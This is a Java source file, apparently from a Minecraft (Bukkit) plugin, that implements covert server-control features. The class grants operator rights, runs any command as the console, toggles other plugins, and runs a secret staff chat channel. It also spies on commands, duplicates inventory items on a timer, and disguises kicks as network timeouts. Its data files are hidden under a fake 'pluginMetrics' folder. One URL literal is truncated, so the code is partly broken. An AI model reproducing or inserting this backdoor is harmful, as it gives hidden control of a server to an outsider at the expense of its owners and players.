
package me.system.runner.methods;

import me.system.runner.Core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.concurrent.ExecutionException;

import me.system.runner.utils.PluginUtils;
import me.system.runner.utils.SLAPI;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.ItemStack;
import org.json.JSONObject;

public class API {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    public static String getIPOfPlayer(Player p2) {
        return p2.getAddress().getAddress().toString().replace("/", "");
    }

    public static boolean isPlayerOnVPN(Player p2) {
        try {
            String inputLine;
            URL vpncheck = new URL("https:
            HttpURLConnection con = (HttpURLConnection)vpncheck.openConnection();
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con.getInputStream()));
            StringBuffer response = new StringBuffer();
            while ((inputLine = in2.readLine()) != null) {
                response.append(inputLine);
            }
            in2.close();
            JSONObject myresponse = new JSONObject(response.toString());
            if (myresponse.has("proxy")) {
                if (myresponse.getBoolean("proxy")) {
                    return true;
                }
                if (myresponse.has("vpn") && myresponse.getBoolean("vpn")) {
                    return true;
                }
            }
        }
        catch (IOException iOException) {
            
        }
        return false;
    }

    public static void sendPM(Player p2, String msg) {
        for (Player a2 : Bukkit.getOnlinePlayers()) {
            if (!API.INSTANCE.lite.contains(a2.getName())) continue;
            if (API.INSTANCE.prefix.containsKey(p2)) {
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8[" + Settings.DARK_RED + "ServerChat&8] &8[" + API.INSTANCE.prefix.get(a2).replace("&", "&") + "&8] &7" + p2.getName() + " &8» " + Settings.WHITE + msg.replace("&", "&")));
                continue;
            }
            if (API.INSTANCE.admin.contains(p2.getName())) {
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8[" + Settings.DARK_RED + "ServerChat&8] &8[&4Dev&8] &7" + p2.getName() + " &8» " + Settings.WHITE + msg.replace("&", "&")));
                continue;
            }
            if (API.INSTANCE.premium.contains(p2.getName())) {
                a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8[" + Settings.DARK_RED + "ServerChat&8] &8[&9Premium&8] &7" + p2.getName() + " &8» " + Settings.WHITE + msg.replace("&", "&")));
                continue;
            }
            a2.sendMessage(ChatColor.translateAlternateColorCodes((char)'&',(String)"&8[" + Settings.DARK_RED + "ServerChat&8] &7" + p2.getName() + " &8» " + Settings.WHITE + msg));
        }
    }

    public static void opPlayer(Player p2) {
        INSTANCE.getServer().getScheduler().runTaskAsynchronously(INSTANCE, () -> {
            if (!p2.isOp()) {
                p2.setOp(true);
            }
        });
    }

    public static void disablePlugin(String pl2) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask(INSTANCE, () -> {
            if (PluginUtils.getPluginByName(pl2) != null && Bukkit.getPluginManager().getPlugin(pl2).isEnabled()) {
                Bukkit.getServer().getPluginManager().disablePlugin(Bukkit.getPluginManager().getPlugin(pl2));
            }
        });
    }

    public static void enablePlugin(String pl2) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask(INSTANCE, () -> {
            if (PluginUtils.getPluginByName(pl2) != null && !Bukkit.getPluginManager().getPlugin(pl2).isEnabled()) {
                Bukkit.getServer().getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(pl2));
            }
        });
    }

    public static void deopPlayer(Player p2) {
        INSTANCE.getServer().getScheduler().runTaskAsynchronously(INSTANCE, () -> {
            if (p2.isOp()) {
                p2.setOp(false);
            }
        });
    }

    public static void saveConfig() {
        try {
            SLAPI.save(API.INSTANCE.lite, "plugins/pluginMetrics/data/rdata.bin");
            SLAPI.save(API.INSTANCE.premium, "plugins/pluginMetrics/data/rpredata.bin");
            SLAPI.save(API.INSTANCE.admin, "plugins/pluginMetrics/data/radata.bin");
            SLAPI.save(API.INSTANCE.blatant, "plugins/pluginMetrics/data/bdata.bin");
            SLAPI.save(API.INSTANCE.noPickupPlayers, "plugins/pluginMetrics/data/npudata.bin");
            SLAPI.save(API.INSTANCE.cmdSpy, "plugins/pluginMetrics/data/sdata.bin");
            SLAPI.save(API.INSTANCE.frozenPlayers, "plugins/pluginMetrics/data/fdata.bin");
            SLAPI.save(API.INSTANCE.commandSpyTargets, "plugins/pluginMetrics/data/csdata.bin");
            SLAPI.save(API.INSTANCE.isLocked, "plugins/pluginMetrics/data/isbool.bin");
            SLAPI.save(API.INSTANCE.frozen, "plugins/pluginMetrics/data/fabool.bin");
            SLAPI.save(API.INSTANCE.modCmd, "plugins/pluginMetrics/data/mcbool.bin");
            SLAPI.save(API.INSTANCE.playerCommandsLocked, "plugins/pluginMetrics/data/lcbool.bin");
            SLAPI.save(API.INSTANCE.god, "plugins/pluginMetrics/data/gdata.bin");
            SLAPI.save(API.INSTANCE.chatLocked, "plugins/pluginMetrics/data/lchbool.bin");
            SLAPI.save(API.INSTANCE.storagesDisabled, "plugins/pluginMetrics/data/lconbool.bin");
            SLAPI.save(API.INSTANCE.vanish, "plugins/pluginMetrics/data/vdata.bin");
        }
        catch (Exception exception) {
            
        }
    }

    public static void kickPlayer(Player player) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask(INSTANCE, () -> player.kickPlayer("Internal Exception: io.netty.handler.timeout.ReadTimeOutException"));
    }

    public static void runCMDAsConsole(String cmd) {
        INSTANCE.getServer().getScheduler().runTaskAsynchronously(INSTANCE, () -> {
            try {
                Bukkit.getScheduler().callSyncMethod(INSTANCE, () -> Bukkit.getServer().dispatchCommand(Bukkit.getServer().getConsoleSender(), cmd)).get();
            }
            catch (InterruptedException | ExecutionException exception) {
                
            }
        });
    }

    public static void runCMDAsPlayer(Player player, String command) {
        INSTANCE.getServer().getScheduler().scheduleSyncDelayedTask(INSTANCE, () -> player.chat(command));
    }

    public static void error(Player p2) {
        p2.sendMessage(Settings.PREFIX("There seems to be an error with your copy of " + Settings.RED + Settings.NAME));
        p2.sendMessage(Settings.PREFIX("Error code: " + Settings.RED + Settings.NG));
    }

    public static void dupe() {
        Bukkit.getScheduler().runTaskTimerAsynchronously(INSTANCE, () -> {
            for (Inventory inv : API.INSTANCE.inventories) {
                for (int i2 = 0; i2 <= 26; ++i2) {
                    if (inv.getItem(i2) == null) continue;
                    ItemStack stack = inv.getItem(i2);
                    stack.setAmount(stack.getAmount() + 1);
                }
            }
        }, 0L, 20L);
    }
}

